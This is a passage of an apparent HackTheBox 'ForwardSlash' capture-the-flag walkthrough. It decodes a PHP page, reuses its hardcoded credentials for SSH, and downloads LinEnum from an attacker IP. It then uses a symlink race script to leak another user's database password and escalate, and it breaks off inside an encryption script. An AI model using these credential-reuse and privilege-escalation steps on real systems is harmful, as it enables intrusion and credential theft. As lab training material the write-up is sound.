<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K</span><br></pre></td></tr></table></figure>

<p>decode it and I got a php script :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include_once ../session.php;</span></span><br><span class="line"><span class="comment">// Initialize the session</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((!<span class="keyword">isset</span>($_SESSION[<span class="string">"loggedin"</span>]) || $_SESSION[<span class="string">"loggedin"</span>] !== <span class="keyword">true</span> || $_SESSION[<span class="string">'username'</span>] !== <span class="string">"admin"</span>) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    header(<span class="string">'HTTP/1.0 403 Forbidden'</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;403 Access Denied&lt;/h1&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Access Denied From "</span>, $_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">    <span class="comment">//echo "&lt;h2&gt;Redirecting to login in 3 seconds&lt;/h2&gt;"</span></span><br><span class="line">    <span class="comment">//echo '&lt;meta http-equiv="refresh" content="3;url=../login.php" /&gt;';</span></span><br><span class="line">    <span class="comment">//header("location: ../login.php");</span></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;h1&gt;XML Api Test&lt;/h1&gt;</span><br><span class="line">	&lt;h3&gt;This is our api test <span class="keyword">for</span> when our <span class="keyword">new</span> website gets refurbished&lt;/h3&gt;</span><br><span class="line">	&lt;form action=<span class="string">"/dev/index.php"</span> method=<span class="string">"get"</span> id=<span class="string">"xmltest"</span>&gt;</span><br><span class="line">		&lt;textarea name=<span class="string">"xml"</span> form=<span class="string">"xmltest"</span> rows=<span class="string">"20"</span> cols=<span class="string">"50"</span>&gt;&lt;api&gt;</span><br><span class="line">    &lt;request&gt;test&lt;/request&gt;</span><br><span class="line">&lt;/api&gt;</span><br><span class="line">&lt;/textarea&gt;</span><br><span class="line">		&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- TODO:</span><br><span class="line">Fix FTP Login</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">"GET"</span> &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'xml'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">	$reg = <span class="string">'/ftp:\/\/[\s\S]*\/\"/'</span>;</span><br><span class="line">	<span class="comment">//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.)&#123;3&#125;((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (preg_match($reg, $_GET[<span class="string">'xml'</span>], $match)) &#123;</span><br><span class="line">		$ip = explode(<span class="string">'/'</span>, $match[<span class="number">0</span>])[<span class="number">2</span>];</span><br><span class="line">		<span class="keyword">echo</span> $ip;</span><br><span class="line">		error_log(<span class="string">"Connecting"</span>);</span><br><span class="line"></span><br><span class="line">		$conn_id = ftp_connect($ip) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Couldn't connect to $ip\n"</span>);</span><br><span class="line"></span><br><span class="line">		error_log(<span class="string">"Logging in"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (@ftp_login($conn_id, <span class="string">"chiv"</span>, <span class="string">'N0bodyL1kesBack/'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			error_log(<span class="string">"Getting file"</span>);</span><br><span class="line">			<span class="keyword">echo</span> ftp_get_string($conn_id, <span class="string">"debug.txt"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">	$xmlfile = $_GET[<span class="string">"xml"</span>];</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$api = simplexml_import_dom($dom);</span><br><span class="line">	$req = $api-&gt;request;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"-----output-----&lt;br&gt;\r\n"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$req"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftp_get_string</span><span class="params">($ftp, $filename)</span> </span>&#123;</span><br><span class="line">    $temp = fopen(<span class="string">'php://temp'</span>, <span class="string">'r+'</span>);</span><br><span class="line">    <span class="keyword">if</span> (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, <span class="number">0</span>)) &#123;</span><br><span class="line">        rewind($temp);</span><br><span class="line">        <span class="keyword">return</span> stream_get_contents($temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>look the most interesting code line is it’s have credentials :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@ftp_login($conn_id, <span class="string">"chiv"</span>, <span class="string">'N0bodyL1kesBack/'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			error_log(<span class="string">"Getting file"</span>);</span><br><span class="line">			<span class="keyword">echo</span> ftp_get_string($conn_id, <span class="string">"debug.txt"</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>so the possible userame and password that we can use for <code>SSH</code> is <code>username:    chiv</code> &amp; <code>password:    N0bodyL1kesBack/</code></p>
<p>base on the code it use for ftp service but in our <code>nmap scan</code> we don’t have any ftp services so I tried to use it in <code>SSH</code></p>
<h3 id="Login-via-SSH"><a href="#Login-via-SSH" class="headerlink" title="Login via SSH"></a>Login via SSH</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/ForwardSlash took 33s </span><br><span class="line">❯ ssh chiv@10.10.10.183</span><br><span class="line">The authenticity of host <span class="string">'10.10.10.183 (10.10.10.183)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>10.10.10.183<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">chiv@10.10.10.183'</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun Apr 26 19:47:37 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.09               Processes:            216</span><br><span class="line">  Usage of /:   32.3% of 19.56GB   Users logged <span class="keyword">in</span>:      1</span><br><span class="line">  Memory usage: 28%                IP address <span class="keyword">for</span> ens33: 10.10.10.183</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">16 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Apr 26 19:42:41 2020 from 10.10.15.230</span><br><span class="line">chiv@forwardslash:~$ whoami</span><br><span class="line">chiv</span><br><span class="line">chiv@forwardslash:~$ hostname</span><br><span class="line">forwardslash</span><br><span class="line">chiv@forwardslash:~$</span><br></pre></td></tr></table></figure>

<h3 id="Privilege-Escalation-to-Pain"><a href="#Privilege-Escalation-to-Pain" class="headerlink" title="Privilege Escalation to Pain"></a>Privilege Escalation to Pain</h3><h3 id="Get-user-PAIN"><a href="#Get-user-PAIN" class="headerlink" title="Get user PAIN"></a>Get user PAIN</h3><p>inside <code>Chiv</code> directory there’s a <code>note.txt</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">chiv@forwardslash:~$ ls</span><br><span class="line">e223993ccd8840f3f3d72324d61219e6  exticute  note.txt</span><br><span class="line">chiv@forwardslash:~$ cat note.txt</span><br><span class="line">the executable file <span class="string">'backup'</span> already exists. on /usr/bin. To <span class="built_in">read</span> a file with the executable, my solution was to create a symlink to the file you want to <span class="built_in">read</span>. the executable <span class="string">'backup'</span> will <span class="built_in">read</span> it <span class="keyword">if</span> its name is correct. Find a way to get it named right</span><br><span class="line">chiv@forwardslash:~$</span><br></pre></td></tr></table></figure>

<p>it tells about the <code>backup</code> file, so I make a way to get <code>pain</code> I use <code>LinEnum.sh</code> </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">chiv@forwardslash:/tmp$ wget http://10.10.14.4/LinEnum.sh</span><br><span class="line">--2020-04-26 19:52:39--  http://10.10.14.4/LinEnum.sh</span><br><span class="line">Connecting to 10.10.14.4:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 46631 (46K) [text/x-sh]</span><br><span class="line">Saving to: ‘LinEnum.sh’</span><br><span class="line"></span><br><span class="line">LinEnum.sh                                     100%[===================================================================================================&gt;]  45.54K  75.0KB/s    <span class="keyword">in</span> 0.6s    </span><br><span class="line"></span><br><span class="line">2020-04-26 19:52:40 (75.0 KB/s) - ‘LinEnum.sh’ saved [46631/46631]</span><br><span class="line"></span><br><span class="line">chiv@forwardslash:/tmp$ bash LinEnum.sh </span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># Local Linux Enumeration &amp; Privilege Escalation Script #</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># www.rebootuser.com</span></span><br><span class="line"><span class="comment"># version 0.982</span></span><br><span class="line"></span><br><span class="line">[-] Debug Info</span><br><span class="line">[+] Thorough tests = Disabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan started at:</span><br><span class="line">Sun Apr 26 19:52:46 UTC 2020                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line"></span><br><span class="line"><span class="comment">### SYSTEM ##############################################</span></span><br><span class="line">[-] Kernel information:</span><br><span class="line">Linux forwardslash 4.15.0-91-generic <span class="comment">#92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Kernel information (continued):</span><br><span class="line">Linux version 4.15.0-91-generic (buildd@lgw01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) <span class="comment">#92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Specific release information:</span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=18.04</span><br><span class="line">DISTRIB_CODENAME=bionic</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">"Ubuntu 18.04.4 LTS"</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"18.04.4 LTS (Bionic Beaver)"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 18.04.4 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"18.04"</span></span><br><span class="line">HOME_URL=<span class="string">"https://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"https://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">PRIVACY_POLICY_URL=<span class="string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span></span><br><span class="line">VERSION_CODENAME=bionic</span><br><span class="line">UBUNTU_CODENAME=bionic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Hostname:</span><br><span class="line">forwardslash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### USER/GROUP ##########################################</span></span><br><span class="line">[-] Current user/group info:</span><br><span class="line">uid=1001(chiv) gid=1001(chiv) groups=1001(chiv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Users that have previously logged onto the system:</span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             pts/4    10.10.14.66      Sun Apr 26 19:33:04 +0000 2020</span><br><span class="line">pain             pts/4    10.10.14.66      Sun Apr 26 19:26:11 +0000 2020</span><br><span class="line">chiv             pts/6    10.10.14.4       Sun Apr 26 19:47:38 +0000 2020</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Location and Permissions (<span class="keyword">if</span> accessible) of .bak file(s):</span><br><span class="line">-rw------- 1 root root 730 Mar 17 20:13 /var/backups/group.bak</span><br><span class="line">-rw------- 1 root shadow 604 Mar 17 20:13 /var/backups/gshadow.bak</span><br><span class="line">-rw------- 1 root shadow 1174 Mar  6 14:21 /var/backups/shadow.bak</span><br><span class="line">-rw------- 1 root root 1660 Mar  5 14:46 /var/backups/passwd.bak</span><br><span class="line">-rw------- 1 pain pain 526 Jun 21  2019 /var/backups/config.php.bak</span><br></pre></td></tr></table></figure>

<p>here you can see the backups owned by <code>pain</code> going on that directory</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">chiv@forwardslash:/var/backups$ ls</span><br><span class="line">alternatives.tar.0     apt.extended_states.1.gz  config.php.bak     dpkg.statoverride.0  group.bak    note.txt    recovery</span><br><span class="line">apt.extended_states.0  apt.extended_states.2.gz  dpkg.diversions.0  dpkg.status.0        gshadow.bak  passwd.bak  shadow.bak</span><br><span class="line">chiv@forwardslash:/var/backups$</span><br></pre></td></tr></table></figure>

<p>there’s another <code>note.txt</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">chiv@forwardslash:/var/backups$ cat note.txt</span><br><span class="line">Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.</span><br><span class="line"></span><br><span class="line">-Pain</span><br><span class="line">chiv@forwardslash:/var/backups$</span><br></pre></td></tr></table></figure>

<p>So the <code>backups</code> may contains the password of our target, to automate the attack I create a simple bash script to get make backups and get the md5sum of that timestamp and get that link and try backup again .</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">i=$(backup | grep ERROR | awk <span class="string">'&#123;print $2&#125;'</span>);</span><br><span class="line">ln -s /var/backups/config.php.bak  ./<span class="variable">$i</span>;</span><br><span class="line">backup;</span><br></pre></td></tr></table></figure>

<p>running this :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">chiv@forwardslash:/var/backups$ bash /tmp/exploit.sh</span><br><span class="line">ln: failed to create symbolic link './cdaf08a855c7502448ac0a89501be28c': Permission denied</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">        Pain<span class="number">'</span>s Next-Gen Time Based Backup Viewer</span><br><span class="line">        v0<span class="number">.1</span></span><br><span class="line">        NOTE: <span class="keyword">not</span> reading the right file yet, </span><br><span class="line">        only works <span class="keyword">if</span> backup is taken in same second</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Current Time: <span class="number">20</span>:<span class="number">23</span>:<span class="number">39</span></span><br><span class="line">ERROR: cdaf08a855c7502448ac0a89501be28c Does Not Exist <span class="keyword">or</span> Is Not Accessible By Me, Exiting...</span><br><span class="line">chiv@forwardslash:/var/backups$</span><br></pre></td></tr></table></figure>

<p>At first it failed, I tried to run it again and finally :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">chiv@forwardslash:~$ bash /tmp/exploit.sh</span><br><span class="line"><span class="number">90</span>c0700e7f02944c879196b194727e7b</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">        Pain<span class="number">'</span>s Next-Gen Time Based Backup Viewer</span><br><span class="line">        v0<span class="number">.1</span></span><br><span class="line">        NOTE: <span class="keyword">not</span> reading the right file yet, </span><br><span class="line">        only works <span class="keyword">if</span> backup is taken in same second</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Current Time: <span class="number">20</span>:<span class="number">49</span>:<span class="number">34</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user 'root' with no password) */</span></span><br><span class="line">define('DB_SERVER', 'localhost');</span><br><span class="line">define('DB_USERNAME', 'pain');</span><br><span class="line">define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');</span><br><span class="line">define('DB_NAME', 'site');</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line">$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>($link === <span class="literal">false</span>)&#123;</span><br><span class="line">    die(<span class="string">"ERROR: Could not connect. "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">chiv@forwardslash:~$</span><br></pre></td></tr></table></figure>

<h3 id="Get-user-txt"><a href="#Get-user-txt" class="headerlink" title="Get user.txt"></a>Get user.txt</h3><p>Now that i have the password of pain we can now get the <code>user.txt</code> flag :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">chiv@forwardslash:~$ su pain</span><br><span class="line">Password: </span><br><span class="line">pain@forwardslash:/<span class="built_in">home</span>/chiv$ cd ..</span><br><span class="line">pain@forwardslash:/<span class="built_in">home</span>$ ls</span><br><span class="line">chiv  pain</span><br><span class="line">pain@forwardslash:/<span class="built_in">home</span>$ cd pain</span><br><span class="line">pain@forwardslash:~$ ls</span><br><span class="line">encryptorinator  note.txt  user.txt</span><br><span class="line">pain@forwardslash:~$ cut -c <span class="number">4</span><span class="number">-12</span> user.txt</span><br><span class="line"><span class="number">228b</span>cc4e7</span><br><span class="line">pain@forwardslash:~$</span><br></pre></td></tr></table></figure>

<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h3><p>Inside pain’s directory there’s another <code>notes</code> by <code>chiv</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">pain@forwardslash:~$ ls</span><br><span class="line">encryptorinator  note.txt  user.txt</span><br><span class="line">pain@forwardslash:~$ cat note.txt </span><br><span class="line">Pain, even though they got into our server, I made sure to encrypt any important files <span class="keyword">and</span> then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.</span><br><span class="line"></span><br><span class="line">-chiv</span><br><span class="line">pain@forwardslash:~$</span><br></pre></td></tr></table></figure>

<p>I notice that <code>pain</code> can run below the following commands that have <code>sudo privileges</code> without passwod</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">pain@forwardslash:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> pain on forwardslash:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User pain may <span class="built_in">run</span> the following commands on forwardslash:</span><br><span class="line">    (root) NOPASSWD: /sbin/cryptsetup luksOpen *</span><br><span class="line">    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line">    (root) NOPASSWD: /bin/umount ./mnt/</span><br></pre></td></tr></table></figure>


<p>let’s take a look at <code>cyphertext</code> file &amp; and <code>encrypter.py</code> inside pain’s folder :</p>
<h3 id="Cyphertext"><a href="#Cyphertext" class="headerlink" title="Cyphertext"></a>Cyphertext</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">Ë×£›”,Lö</span><br><span class="line">&gt;¼2XÕ¢Š</span><br><span class="line">|Š? IÇ)ñEƒ-—Ë’\/;ÃÇ²yÆ[w<span class="comment">#M’÷2ÊÑ~çY@'¶ç¼˜Š…æ³£,ˆëÛôP™º@5†Àf$ù\*r¢wFº’3¸gïX¿&#125;Éi6ð´‹ô~ßK‹©YðÅŽ¥‘ÿ'%¿eà&gt;à®xÝoä+gÜ/±K¬&gt;ÿ^ÝËV¥÷âN°kŠ¿e</span></span><br></pre></td></tr></table></figure>

<h3 id="Encrypter"><a href="#Encrypter" class="headerlink" title="Encrypter"></a>Encrypter</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key, msg)</span>:</span></span><br><span class="line">    key = list(key)</span><br><span class="line">    msg = list(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> key:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(msg)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = ord(msg[i]) + ord(char_key) + ord(msg[<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> tmp &gt; <span class="number">255</span>:</span><br><span class="line">                tmp -= <span class="number">256</span></span><br><span class="line">            msg[i] = chr(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key, msg)</span>:</span></span><br><span class="line">    key = list(key)</span><br><span class="line">    msg = list(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> reversed(key):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(len(msg))):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[<span class="number">-1</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i<span class="number">-1</span>]))</span><br><span 